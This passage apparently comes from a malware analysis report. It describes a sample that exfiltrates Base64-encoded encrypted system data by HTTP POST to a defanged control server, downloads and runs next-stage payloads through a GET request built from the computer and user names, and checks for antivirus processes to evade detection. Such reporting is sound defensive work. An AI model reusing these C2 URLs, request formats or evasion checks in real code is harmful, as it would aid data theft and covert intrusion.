
The encrypted content is written to the data file 1.hwp.
During the exfiltration process, the malware Base64-encodes the encrypted data and sends it to its control server using an HTTP POST request to the URL: http://ink[dot]inkboom.co.kr/host/img/jpg/post.php HTTP data/parameters used in the request include: Content-Type: multipart/form-data; boundary=—-WebKitFormBoundar ywhpFxMBe19cSjFnG <followed by base64 encoded & encrypted system info>
User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET
CLR 1.1.4322) Accept-Language: en-us HTTP
Version:
HTTP/1.0 The malware can also download and execute additional components served to it by the control server.
The mechanism for downloading additional components is based on the Computer Name and UserName of the endpoint provided by the malware process to the control server in the following HTTP GET request: GET http://ink[dot]inkboom.co.kr/host/img/jpg/download.php?filename=<Computer_Name>_<username>&continue=dnsadmin
After successfully retrieving the component from the control server, the next-stage payload is copied to the Application Data directory of the current user and executed: C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\hupdate.ex (note “ex,” not “exe”)
The capability to download additional components from the control server.
The malware demonstrates its evasive behavior by checking for the presence of specific processes related to antimalware products: The presence of any process with the keywords “v3” and “cleaner.”